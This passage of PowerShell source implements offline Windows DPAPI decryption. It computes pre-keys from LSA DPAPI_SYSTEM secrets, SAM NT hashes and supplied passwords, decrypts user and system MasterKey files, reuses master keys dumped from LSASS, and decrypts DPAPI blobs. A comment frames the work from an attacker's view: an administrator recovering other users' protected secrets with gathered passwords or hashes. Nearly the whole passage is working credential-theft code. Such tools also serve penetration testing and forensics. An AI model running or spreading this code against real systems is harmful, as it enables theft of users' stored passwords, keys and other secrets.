			- Wi-Fi passwords have known locations
		4- Decrypt the DPAPI Secret (or DPAPI Blob) with the corresponding MasterKey (MKGUID) decrypted (If we have It)

	NOTE: MasterKeys can be stored and retrieved from LSASS (implemented)
#>

<### Get MasterKeys decrypted ###>

function Get-PreKeys($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes)
{
	<#
		Get-PreKeys:
			1- Get System User PreKey and System Machine PreKey from DPAPI_SYSTEM of LSA Storage
			2- Get Users' PreKeys from their NT Hashes into SAM
				- Key2 = HMAC-SHA1 (SHA1 (NTHash), SID + "\x00") (For domain users)
				- Key3 = HMAC-SHA1 (PKBKDF2-HMAC-SHA256 (PKBKDF2-HMAC-SHA256 (NTHash, SID), SID), SID + "\x00") (For users of "Protected users" group)
			3- Get Users' PreKeys from provided Pwds/NTHashes (may have collision from SAM)
				- Key1 = HMAC-SHA1 (SHA1 (Pwd), SID + "\x00") (For local users)
				- Key2 = HMAC-SHA1 (SHA1 (NTHash), SID + "\x00") (For domain users)
				- Key3 = HMAC-SHA1 (PKBKDF2-HMAC-SHA256 (PKBKDF2-HMAC-SHA256 (NTHash, SID), SID), SID + "\x00") (For users of "Protected users" group)
	#>

	# PreKeys from LSA DPAPI System Machine/User PreKey
	$Key = @{}
	$Key["Type"] = "System Machine PreKey"
	$Key["Value"] = $LSA_DPAPI_SYSTEM[4..23]
	$PreKeys = ,($Key)
	$Key = @{}
	$Key["Type"] = "System User PreKey"
	$Key["Value"] = $LSA_DPAPI_SYSTEM[24..43]
	$PreKeys += ,($Key)

	# PreKeys from SAM
	# Key2 = HMAC-SHA1 (SHA1 (NTHash), SID + "\x00") (For domain users)
	# Key3 = HMAC-SHA1 (PKBKDF2-HMAC-SHA256 (PKBKDF2-HMAC-SHA256 (NTHash, SID), SID), SID + "\x00") (For users of "Protected users" group)
	ForEach ($User in $SAM.Keys)
	{
		$UserPreKeys = @{}

		$SID = ((New-Object System.Security.Principal.NTAccount($User)).Translate([System.Security.Principal.SecurityIdentifier])).Value
		$NTH = $SAM[$User]["NT"]

		$HMACSHA1 = [System.Security.Cryptography.HMACSHA1]::Create()
		$HMACSHA1.Key = $NTH
		$Key = @{}
		$Key["Type"] = ("User PreKey 2 from SAM - {0}" -f ($SID))
		$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
		$PreKeys += ,($Key)

		$TmpKey = PBKDF2_HMAC_SHA256 $NTH ([Text.Encoding]::Unicode.GetBytes($SID)) 256 10000
		$TmpKey2 = (PBKDF2_HMAC_SHA256 $TmpKey ([Text.Encoding]::Unicode.GetBytes($SID)) 256 1)[0..15]
		$HMACSHA1.Key = $TmpKey2
		$Key = @{}
		$Key["Type"] = ("User PreKey 3 from SAM - {0}" -f ($SID))
		$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
		$PreKeys += ,($Key)
	}

	# PreKeys from provided Pwds and NTHashes
	# Key1 = HMAC-SHA1 (SHA1 (Pwd), SID + "\x00") (For local users)
	# Key2 = HMAC-SHA1 (SHA1 (NTHash), SID + "\x00") (For domain users)
	# Key3 = HMAC-SHA1 (PKBKDF2-HMAC-SHA256 (PKBKDF2-HMAC-SHA256 (NTHash, SID), SID), SID + "\x00") (For users of "Protected users" group)
	If ($Pwds)
	{
		ForEach ($SID in $Pwds.Keys)
		{
			ForEach ($Pwd in $Pwds[$SID])
			{
				$NTH = MD4Transform ($Pwd["Value"])

				$SHA1_Pwd = [System.Security.Cryptography.SHA1]::Create().ComputeHash($Pwd["Value"])
				$HMACSHA1 = [System.Security.Cryptography.HMACSHA1]::Create()
				$HMACSHA1.Key = $SHA1_Pwd
				$Key = @{}
				$Key["Type"] = ("User PreKey 1 from provided pwd ({0}) - {1}" -f ($Pwd["Origin"], $SID))
				$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
				$PreKeys += ,($Key)
				ForEach ($PreKey in $PreKeys)
				{
					If (@(Compare-Object $PreKey["Value"] $Key["Value"] -SyncWindow 0).Length -eq 0)
					{
						$AlreadyExist = $True
					}
				}
				If (-not $AlreadyExist) { $PreKeys += ,($Key) }

				$HMACSHA1 = [System.Security.Cryptography.HMACSHA1]::Create()
				$HMACSHA1.Key = $NTH
				$Key = @{}
				$Key["Type"] = ("User PreKey 2 from provided pwd ({0}) - {1}" -f ($Pwd["Origin"], $SID))
				$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
				$AlreadyExist = $False
				ForEach ($PreKey in $PreKeys)
				{
					If (@(Compare-Object $PreKey["Value"] $Key["Value"] -SyncWindow 0).Length -eq 0)
					{
						$AlreadyExist = $True
					}
				}
				If (-not $AlreadyExist) { $PreKeys += ,($Key) }

				$TmpKey = PBKDF2_HMAC_SHA256 $NTH ([Text.Encoding]::Unicode.GetBytes($SID)) 256 10000
				$TmpKey2 = (PBKDF2_HMAC_SHA256 $TmpKey ([Text.Encoding]::Unicode.GetBytes($SID)) 256 1)[0..15]
				$HMACSHA1.Key = $TmpKey2
				$Key = @{}
				$Key["Type"] = ("User PreKey 3 from provided pwd ({0}) - {1}" -f ($Pwd["Origin"], $SID))
				$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
				$AlreadyExist = $False
				ForEach ($PreKey in $PreKeys)
				{
					If (@(Compare-Object $PreKey["Value"] $Key["Value"] -SyncWindow 0).Length -eq 0)
					{
						$AlreadyExist = $True
					}
				}
				If (-not $AlreadyExist) { $PreKeys += ,($Key) }
			}
		}
	}
	If ($NTHashes)
	{
		ForEach ($SID in $NTHashes.Keys)
		{
			ForEach ($NTHash in $NTHashes[$SID])
			{
				$NTH = $NTHash["Value"]

				$HMACSHA1 = [System.Security.Cryptography.HMACSHA1]::Create()
				$HMACSHA1.Key = $NTH
				$Key = @{}
				$Key["Type"] = ("User PreKey 2 from provided NT hash ({0}) - {1}" -f ($NTHash["Origin"], $SID))
				$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
				$AlreadyExist = $False
				ForEach ($PreKey in $PreKeys)
				{
					If (@(Compare-Object $PreKey["Value"] $Key["Value"] -SyncWindow 0).Length -eq 0)
					{
						$AlreadyExist = $True
					}
				}
				If (-not $AlreadyExist) { $PreKeys += ,($Key) }

				$TmpKey = PBKDF2_HMAC_SHA256 $NTH ([Text.Encoding]::Unicode.GetBytes($SID)) 256 10000
				$TmpKey2 = (PBKDF2_HMAC_SHA256 $TmpKey ([Text.Encoding]::Unicode.GetBytes($SID)) 256 1)[0..15]
				$HMACSHA1.Key = $TmpKey2
				$Key = @{}
				$Key["Type"] = ("User PreKey 3 from provided NT hash ({0}) - {1}" -f ($NTHash["Origin"], $SID))
				$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
				$AlreadyExist = $False
				ForEach ($PreKey in $PreKeys)
				{
					If (@(Compare-Object $PreKey["Value"] $Key["Value"] -SyncWindow 0).Length -eq 0)
					{
						$AlreadyExist = $True
					}
				}
				If (-not $AlreadyExist) { $PreKeys += ,($Key) }
			}
		}
	}

	return $PreKeys
}

function Decrypt-MasterKey($MKType, $PreKeys, $Enc_Key, $HashAlgo, $CipherAlgo, $Salt, $IterationCount)
{
	<#
		Decrypt-MasterKey:
			1- Decrypt a MasterKey (Master Key/Domain Backup Master Key/Local Backup Master Key (Windows 2000)/Local Backup Encryption Key)
			2- Validate the MasterKey decryption success or not
	#>

	# Load C# Registry Key functions
	If (-Not (Test-Path Variable:Global:ALG_CLASS_ANY))
	{
		LoadCryptoConstants
	}

	If ($HashAlgo -eq $Global:ALGORITHMS["CALG_HMAC"])
	{
		$HashType = "SHA1"
	}
	Else
	{
		$HashType = $Global:ALGORITHMS_DATA[$HashAlgo][1]
	}
	Switch ($HashType)
	{
		"SHA1" { $Hasher = New-Object System.Security.Cryptography.HMACSHA1 }
		"SHA512" { $Hasher = New-Object System.Security.Cryptography.HMACSHA512 }
	}
	$KeyLen = $Global:ALGORITHMS_DATA[$CipherAlgo][0] + $Global:ALGORITHMS_DATA[$CipherAlgo][3]
	ForEach ($PreKey in $PreKeys)
	{
		$Hasher.Key = $PreKey["Value"]
		$TmpKeyBlob = [byte[]]@()
		$i = 1
		While ($TmpKeyBlob.Length -lt $KeyLen)
		{
			$Bytes = [BitConverter]::GetBytes($i)
			[Array]::Reverse($Bytes)
			$U = $Salt + $Bytes
			$i += 1
			$Derived = $Hasher.ComputeHash($U)
			For ($x = 0; $x -lt $IterationCount-1; $x += 1)
			{
				$Actual = $Hasher.ComputeHash($Derived)
				$Derived = BigIntBooleanXor $Derived $Actual
				If ($Derived.Length -lt $Actual.Length)
				{
					$Derived += (,[byte]0) * ($Actual.Length - $Derived.Length)
				}
			}
			$TmpKeyBlob += $Derived
		}

		$TmpKey = $TmpKeyBlob[0..$($KeyLen-1)]
		$CipherKey = $TmpKey[0..$($Global:ALGORITHMS_DATA[$CipherAlgo][0]-1)]
		$IV = ($TmpKey[$($Global:ALGORITHMS_DATA[$CipherAlgo][0])..$($TmpKey.Length-1)])[0..$($Global:ALGORITHMS_DATA[$CipherAlgo][3]-1)]
		$Mode = ($Global:ALGORITHMS_DATA[$CipherAlgo])[2]
		Switch ($CipherAlgo)
		{
		   $Global:ALGORITHMS["CALG_3DES"] { $ClearText = TripleDESTransform $CipherKey $Enc_Key $IV $Mode $False }
		   $Global:ALGORITHMS["CALG_AES_256"] { $ClearText = AESTransform $CipherKey $Enc_Key $IV ([Security.Cryptography.CipherMode]::CBC) $False }
		}

		$Decrypted_MasterKey = $ClearText[$($ClearText.Length-64)..$($ClearText.Length-1)]
		$HMAC_Salt = $ClearText[0..15]
		$HMAC_Res = ($ClearText[16..$($ClearText.Length-1)])[0..$($Global:ALGORITHMS_DATA[$HashAlgo][0]-1)]

		$HMAC_Key = $Hasher.ComputeHash($HMAC_Salt)
		$Hasher.Key = $HMAC_Key
		$HMAC_Calc = $Hasher.ComputeHash($Decrypted_MasterKey)
		If (@(Compare-Object $HMAC_Calc[0..$($Global:ALGORITHMS_DATA[$HashAlgo][0]-1)] $HMAC_Res -SyncWindow 0).Length -eq 0)
		{
			Write-Host ("[...] Decrypted {0} with PreKey {1} = {2}" -f ($MKType, ([System.BitConverter]::ToString($PreKey["Value"]).Replace("-", "")), ([System.BitConverter]::ToString($Decrypted_MasterKey).Replace("-", ""))))
			return $Decrypted_MasterKey
		}
	}

	Write-Host ("[...] None PreKeys allowed to decrypt {0}" -f ($MKType))
	return $Null
}

function ParseMasterKeyFile($PreKeys, $FileName)
{
	<#
		ParseMasterKeyFile:
			1- Extract elements of MasterKey File (Master Key/Domain Backup Master Key/Local Backup Master Key (Windows 2000)/Local Backup Encryption Key)
			2- Decrypt them with Decrypt-MasterKey to obtain the unique MasterKey decrypted
	#>

	# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : MasterKeyFile
	$MasterKeyFile = [System.IO.File]::ReadAllBytes($FileName)
	$Version = $MasterKeyFile[0..3]
	$Unknown1 = $MasterKeyFile[4..7]
	$Unknown2 = $MasterKeyFile[8..11]
	$MKGUID = [Text.Encoding]::Unicode.GetString($MasterKeyFile[12..83])
	$Unknown3 = $MasterKeyFile[84..87]
	$Policy = $MasterKeyFile[88..91]
	$Flags = $MasterKeyFile[92..95]
	$MasterKeyLength = [BitConverter]::ToUInt32($MasterKeyFile[96..103], 0)
	$LocalBackupEncryptionKeyLength = [BitConverter]::ToUInt32($MasterKeyFile[104..111], 0)
	$CREDHIST_GUIDLength = [BitConverter]::ToUInt32($MasterKeyFile[112..119], 0)
	$DomainBackupMasterKeyLength = [BitConverter]::ToUInt32($MasterKeyFile[120..127], 0)

	$Keys = @{}
	$MasterKeyFile = $MasterKeyFile[128..$($MasterKeyFile.Length-1)]
	If ($MasterKeyLength -gt 0)
	{
		$Data = $MasterKeyFile[0..$($MasterKeyLength-1)]
		# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : MasterKey
		$Version = $Data[0..3]
		$Salt = $Data[4..19]
		$IterationCount = [BitConverter]::ToUInt32($Data[20..23], 0)
		$HashAlgo = [BitConverter]::ToUInt32($Data[24..27], 0)
		$CipherAlgo = [BitConverter]::ToUInt32($Data[28..31], 0)
		$Enc_Key = $Data[32..$($Data.Length-1)]

		$MasterKey = Decrypt-MasterKey "MasterKey" $PreKeys $Enc_Key ([UInt64]$HashAlgo) ([UInt64]$CipherAlgo) $Salt $IterationCount
		If ($MasterKey) { $Keys["MasterKey"] = $MasterKey }

		$MasterKeyFile = $MasterKeyFile[$($MasterKeyLength)..$($MasterKeyFile.Length-1)]
	}
	If ($LocalBackupEncryptionKeyLength -gt 0)
	{
		# Local Backup Encryption Key can be use to decrypt Local Backup Master Key in Windows 2000
		# Out-of-scope and not implemented

		<#
		$Data = $MasterKeyFile[0..$($LocalBackupEncryptionKeyLength-1)]
		# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : MasterKey
		$Version = $Data[0..3]
		$Salt = $Data[4..19]
		$IterationCount = [BitConverter]::ToUInt32($Data[20..23], 0)
		$HashAlgo = [BitConverter]::ToUInt32($Data[24..27], 0)
		$CipherAlgo = [BitConverter]::ToUInt32($Data[28..31], 0)
		$Enc_Key = $Data[32..$($Data.Length-1)]

		$LocalBackupEncryptionKey = Decrypt-MasterKey "LocalBackupEncryptionKey" $PreKeys $Enc_Key ([UInt64]$HashAlgo) ([UInt64]$CipherAlgo) $Salt $IterationCount
		If ($LocalBackupEncryptionKey) { $Keys["LocalBackupEncryptionKey"] = $LocalBackupEncryptionKey }
		#>

		$MasterKeyFile = $MasterKeyFile[$($LocalBackupEncryptionKeyLength)..$($MasterKeyFile.Length-1)]
	}
	If ($CREDHIST_GUIDLength -gt 0)
	{
		# Not used to decrypt MasterKey for now, but point to CREDHIST File that contain Old User's PreKeys encrypted which may be use to decrypt MasterKey

		<#
		$CREDHIST_GUID = $MasterKeyFile[0..$($CREDHIST_GUIDLength-1)]
		# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : CredHist
		$Version = $CREDHIST_GUID[0..3]
		$GUID = [Text.Encoding]::ASCII.GetString($CREDHIST_GUID[4..19])
		$Keys["CREDHIST_GUID"] = $GUID
		#>

		$MasterKeyFile = $MasterKeyFile[$($CREDHIST_GUIDLength)..$($MasterKeyFile.Length-1)]
	}
	If ($DomainBackupMasterKeyLength -gt 0)
	{
		# Not implemented Domain Backup Master Key decryption for now

		<#
		$Data = $MasterKeyFile[0..$($DomainBackupMasterKeyLength-1)]
		# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : DomainKey
		$Version = $Data[0..3]
		$SecretLength = [BitConverter]::ToUInt32($Data[4..7], 0)
		$AccessCheckLength = [BitConverter]::ToUInt32($Data[8..11], 0)
		$GUID = $Data[12..27]
		$Secret = $Data[28..$(28+($SecretLength-1))]
		$AccessCheck = $Data[$(28+$SecretLength)..$(28+$SecretLength+$AccessCheckLength-1)]
		$Keys["DomainBackupMasterKey"] = Decrypt-DomainBackupMasterKey ...
		#>
	}

	return ($MKGUID, $Keys)
}

function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSASS_MasterKeys)
{
	<#
		Get-MasterKeysFromFiles:
			1- Get all Users' MasterKey Files and try to decrypt each elements to obtain the decrypted MasterKey
				- C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<UserSID>\<MKGUID>
			2- Get all System's MasterKey Files and try to decrypt each elements to obtain the decrypted MasterKey
				- C:\Windows\System32\Microsoft\Protect\User\<MKGUID> (System User Master Key File)
				- C:\Windows\System32\Microsoft\Protect\<MKGUID> (System Machine Master Key File)
	#>

	Write-Host ("`n[===] Try to decrypt all Master Keys Files with LSA DPAPI System Machine/User Keys and user's passwords/NT Hashes [===]")

	# Retrieve all Pre Keys
	Write-Host ("[+] Compute PreKeys")
	$PreKeys = Get-PreKeys $LSA_DPAPI_SYSTEM $SAM $Pwds $NTHashes
	ForEach ($PreKey in $PreKeys)
	{
		Write-Host ("[...] {0} = {1}" -f ($PreKey["Type"], [System.BitConverter]::ToString($PreKey["Value"]).Replace("-", "")))
	}

	$MasterKeys = @{}

	# Get Users' Master Keys decrypted
	$UserMasterKeys = @{}
	ForEach ($User in (Get-ChildItem "C:\Users" -Force)) # -Attributes Directory+!ReparsePoint,Directory+Hidden+!ReparsePoint
	{
		If (Test-Path "C:\Users\$User\AppData\Roaming\Microsoft\Protect")
		{
			$SID = (Get-ChildItem "C:\Users\$User\AppData\Roaming\Microsoft\Protect").Name
			ForEach ($UserMasterKeyFileName in (Get-ChildItem "C:\Users\$User\AppData\Roaming\Microsoft\Protect\$SID" -Force))
			{
				If ($UserMasterKeyFileName -Match "([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)")
				{
					Write-Host ("[+] Found User MasterKey File {0}" -f ("C:\Users\$User\AppData\Roaming\Microsoft\Protect\$SID\$UserMasterKeyFileName"))

					# Find if the MasterKey is already dumped from LSASS
					$Found = $False
					$MKGUID = $UserMasterKeyFileName.Name
					ForEach ($LSASS_MasterKey in $LSASS_MasterKeys)
					{
						If ($MKGUID -eq $LSASS_MasterKey["Key_GUID"])
						{
							$Found = $True
							Write-Host ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
							$Keys = @{}
							$Keys["MasterKey"] =  $LSASS_MasterKey["MasterKey"]
							$UserMasterKeys[$MKGUID] = $Keys
						}
					}

					# Else try to decrypt It with PreKeys
					If (-not $Found)
					{
						$MKGUID, $Keys = ParseMasterKeyFile $PreKeys "C:\Users\$User\AppData\Roaming\Microsoft\Protect\$SID\$UserMasterKeyFileName"
						If ($Keys.Count -ne 0) { $UserMasterKeys[$MKGUID] = $Keys }
					}
				}
			}
		}
	}
	$MasterKeys["User"] = $UserMasterKeys

	# Get System's Master Keys decrypted
	$SystemMasterKeys = @{}
	ForEach ($SIDItem in (Get-ChildItem "C:\Windows\System32\Microsoft\Protect" -Force))
	{
		$SID = ($SIDItem).Name
		If ($SID -Match "S-[0-9]+-[0-9]+-[0-9]+")
		{
			ForEach ($Item in (Get-ChildItem "C:\Windows\System32\Microsoft\Protect\$SID" -Force)) # -Attributes Directory,Hidden
			{
				If ($Item -match "User")
				{
					ForEach ($ItemUser in (Get-ChildItem "C:\Windows\System32\Microsoft\Protect\$SID\User" -Force))
					{
						If ($ItemUser -Match "([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)")
						{
							$SystemUserMasterKeyFileName = $ItemUser
							Write-Host ("[+] Found System User MasterKey File {0}" -f ("C:\Windows\System32\Microsoft\Protect\$SID\User\$SystemUserMasterKeyFileName"))

							# Find if the MasterKey is already dumped from LSASS
							$Found = $False
							$MKGUID = $SystemUserMasterKeyFileName.Name
							ForEach ($LSASS_MasterKey in $LSASS_MasterKeys)
							{
								If ($MKGUID -eq $LSASS_MasterKey["Key_GUID"])
								{
									$Found = $True
									Write-Host ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
									$Keys = @{}
									$Keys["MasterKey"] =  $LSASS_MasterKey["MasterKey"]
									$SystemMasterKeys[$MKGUID] = $Keys
								}
							}

							# Else try to decrypt It with PreKeys
							If (-not $Found)
							{
								$MKGUID, $Keys = ParseMasterKeyFile $PreKeys "C:\Windows\System32\Microsoft\Protect\$SID\User\$SystemUserMasterKeyFileName"
								If ($Keys.Count -ne 0) { $SystemMasterKeys[$MKGUID] = $Keys }
							}
						}
					}
				}
				ElseIf ($Item -Match "([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)")
				{
					$SystemMachineMasterKeyFileName = $Item
					Write-Host ("[+] Found System Machine MasterKey File {0}" -f ("C:\Windows\System32\Microsoft\Protect\$SID\$SystemMachineMasterKeyFileName"))

					# Find if the MasterKey is already dumped from LSASS
					$Found = $False
					$MKGUID = $SystemMachineMasterKeyFileName.Name
					ForEach ($LSASS_MasterKey in $LSASS_MasterKeys)
					{
						If ($MKGUID -eq $LSASS_MasterKey["Key_GUID"])
						{
							$Found = $True
							Write-Host ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
							$Keys = @{}
							$Keys["MasterKey"] =  $LSASS_MasterKey["MasterKey"]
							$SystemMasterKeys[$MKGUID] = $Keys
						}
					}

					# Else try to decrypt It with PreKeys
					If (-not $Found)
					{
						$MKGUID, $Keys = ParseMasterKeyFile $PreKeys "C:\Windows\System32\Microsoft\Protect\$SID\$SystemMachineMasterKeyFileName"
						If ($Keys.Count -ne 0) { $SystemMasterKeys[$MKGUID] = $Keys }
					}
				}
			}
		}
	}
	$MasterKeys["System"] = $SystemMasterKeys

	return $MasterKeys
}

<### Decrypt a DPAPI Blob with MasterKeys ###>

function MKGUID($Data)
{
	<#
		MKGUID: Compute MKGUID from bytes array into DPAPI Blob
	#>

	$Data1 = [BitConverter]::ToUInt32($Data[0..3], 0)
	$Data1 = '{0:x8}' -f $Data1
	$Data2 = [BitConverter]::ToUInt16($Data[4..5], 0)
	$Data2 = '{0:x4}' -f $Data2
	$Data3 = [BitConverter]::ToUInt16($Data[6..7], 0)
	$Data3 = '{0:x4}' -f $Data3
	$X = $Data[8..9]
	[Array]::Reverse($X)
	$X = [BitConverter]::ToUInt16($X, 0)
	$Data4 = '{0:x4}' -f $X
	$X = $Data[10..15]
	[Array]::Reverse($X)
	$X = [BitConverter]::ToUInt64($X + (,([byte]0) * 2), 0)
	$Data5 = '{0:x12}' -f $X

	return "$Data1-$Data2-$Data3-$Data4-$Data5"
}

# Implementation of CryptUnprotectData() of Windows API
# Calling the function CryptUnprotectData() in the context of a user allow to retrieve the secret, encrypted with User MasterKey (which is encrypted with User PreKey), without providing his password
# From the attacker point of view, we are administrator of the computer and we may have gathered password/NT hash for a specific user
# => So we have to implement the cryptographic decryption process of CryptUnprotectData() from Windows API to provide gathered MasterKeys
function Decrypt-DPAPIBlob($Blob, $MasterKeys, $Entropy)
{
	<#
		Decrypt-DPAPIBlob: Decrypt a DPAPI Blob with all gathered MasterKeys
	#>

	# Load C# Registry Key functions
	If (-Not (Test-Path Variable:Global:ALG_CLASS_ANY))
	{
		LoadCryptoConstants
	}

	# Parse DPAPI Blob
	# Structure from Pypykatz DPAPI/Structures/Blob.py : DPAPI_BLOB
	$Version = $Blob[0..3]
	$Credential_GUID = $Blob[4..19]
	$Signature_Start_POS = 20
	$X = $Signature_Start_POS
	$Y = $X + 4
	$MasterKey_Version = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + 16
	$MasterKey_GUID = MKGUID ($Blob[$($X)..$($Y-1)])
	$X = $Y
	$Y = $X + 4
	$Flags = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + 4
	$DescriptionLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + $DescriptionLength
	$Description = [BitConverter]::ToUInt16($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + 4
	$CipherAlgo = [UInt64]([BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0))
	$X = $Y
	$Y = $X + 4
	$CipherLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + 4
	$SaltLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + $SaltLength
	$Salt = $Blob[$($X)..$($Y-1)]
	$X = $Y
	$Y = $X + 4
	$HMACKeyLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
	If ($HMACKeyLength -ge 1)
	{
		$X = $Y
		$Y = $X + $HMACKeyLength
		$HMACKey = $Blob[$($X)..$($Y-1)]
	}
	Else { $HMACKey = [byte[]]@() }
	$X = $Y
	$Y = $X + 4
	$HashAlgo = [UInt64]([BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0))
	$X = $Y
	$Y = $X + 4
	$HashLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + 4
	$HMACLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + $HMACLength
	$HMAC = $Blob[$($X)..$($Y-1)]
	$X = $Y
	$Y = $X + 4
	$DataLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + $DataLength
	$Data = $Blob[$($X)..$($Y-1)]
	$Signature_End_POS = $Y

	$ToSign = $Blob[$($Signature_Start_POS)..$($Signature_End_POS-1)]
	$X = $Y
	$Y = $X + 4
	$SignatureLength = [BitConverter]::ToUInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + $SignatureLength
	$Signature = $Blob[$($X)..$($Y-1)]

	function FixParity($DESKey)
	{
		$Temp = [byte[]]@()
		For ($i = 0; $i -lt $DESKey.Length; $i += 1)
		{
			$T = [Convert]::ToString($DESKey[$($i)], 2)
			$T = "0" * (8 - $T.Length) + $T
			If (($T[0..6] -eq "1").Count % 2 -eq 0)
			{
				$Temp += ([BitConverter]::GetBytes([Convert]::ToUInt32($T.Substring(0,7) + "1", 2)))[0]
			}
			Else
			{
				$Temp += ([BitConverter]::GetBytes([Convert]::ToUInt32($T.Substring(0,7) + "0", 2)))[0]
			}
		}

		return $Temp
	}

	$MasterKeyFound = $False
	ForEach ($MKType in $MasterKeys.Keys)
	{
		ForEach ($MKGUID in $MasterKeys[$MKType].Keys)
		{
			If ($MKGUID -eq $MasterKey_GUID)
			{
				$MasterKey = $MasterKeys[$MKType][$MKGUID]["MasterKey"]
				$MasterKeyFound = $True
				Break
			}
		}

		If ($MasterKeyFound) { Break }
	}

	If (-not $MasterKeyFound)
	{
		Write-Host ("[...] MasterKey with GUID {0} not found for decryption" -f ($MasterKey_GUID))
		return $Null
	}

	$MasterKeyHash = [System.Security.Cryptography.SHA1]::Create().ComputeHash($MasterKey)
	Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
	{
		"SHA1" { $Hasher = New-Object System.Security.Cryptography.HMACSHA1 }
		"SHA512" { $Hasher = New-Object System.Security.Cryptography.HMACSHA512 }
	}
	If ($Entropy) { $ToHash = $Salt + $Entropy }
	Else { $ToHash = $Salt }
	$Hasher.Key = $MasterKeyHash
	$SessionKey = $Hasher.ComputeHash($ToHash)

	If ($SessionKey.Length -gt ($Global:ALGORITHMS_DATA[$HashAlgo])[4])
	{
		$Hasher.Key = $SessionKey
		$DerivedKey = $Hasher.ComputeHash(@())
	}
	Else
	{
		$DerivedKey = $SessionKey
	}

	If ($DerivedKey.Length -lt ($Global:ALGORITHMS_DATA[$CipherAlgo])[0])
	{
		$DerivedKey += (,([byte]0) * ($Global:ALGORITHMS_DATA[$HashAlgo])[4])
		$X = [byte[]]@()
		ForEach ($i in $DerivedKey) { $X += ($i -bxor 0x36) }
		$IPAD = $X[0..$(($Global:ALGORITHMS_DATA[$HashAlgo])[4]-1)]
		$X = [byte[]]@()
		ForEach ($i in $DerivedKey) { $X += ($i -bxor 0x5c) }
		$OPAD = $X[0..$(($Global:ALGORITHMS_DATA[$HashAlgo])[4]-1)]

		Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
		{
			"SHA1" { $X = [System.Security.Cryptography.SHA1]::Create().ComputeHash($IPAD); $Y = [System.Security.Cryptography.SHA1]::Create().ComputeHash($OPAD) }
			"SHA512" { $X = [System.Security.Cryptography.SHA512]::Create().ComputeHash($IPAD); $Y = [System.Security.Cryptography.SHA512]::Create().ComputeHash($OPAD) }
		}
		$DerivedKey = FixParity ($X + $Y)
	}

	$Key = $DerivedKey[0..$(($Global:ALGORITHMS_DATA[$CipherAlgo])[0]-1)]
	$Mode = ($Global:ALGORITHMS_DATA[$CipherAlgo])[2]
	$IV = (,([byte]0) * (($Global:ALGORITHMS_DATA[$CipherAlgo])[3]))
	Switch ($CipherAlgo)
	{
		$Global:ALGORITHMS["CALG_3DES"] { $X = TripleDESTransform $Key $Data $IV $Mode $False }
		$Global:ALGORITHMS["CALG_AES_256"] { $X = AESTransform $Key $Data $IV ([Security.Cryptography.CipherMode]::CBC) $False }
	}
	$ClearText = Unpad ($X)

	# Calculate the different HMACKeys
	Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
	{
		"SHA1" { $HashBlockSize = 64 }
		"SHA512" { $HashBlockSize = 128 }
	}
	$MasterKeyHash2 = $MasterKeyHash + (,([byte]0) * $HashBlockSize)
	$X = [byte[]]@()
	ForEach ($i in $MasterKeyHash2) { $X += ($i -bxor 0x36) }
	$IPAD = $X[0..$($HashBlockSize-1)]
	$X = [byte[]]@()
	ForEach ($i in $MasterKeyHash2) { $X += ($i -bxor 0x5c) }
	$OPAD = $X[0..$($HashBlockSize-1)]

	$ToHash = $IPAD + $HMAC
	Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
	{
		"SHA1" { $A = [System.Security.Cryptography.SHA1]::Create().ComputeHash($ToHash) }
		"SHA512" { $A = [System.Security.Cryptography.SHA512]::Create().ComputeHash($ToHash) }
	}

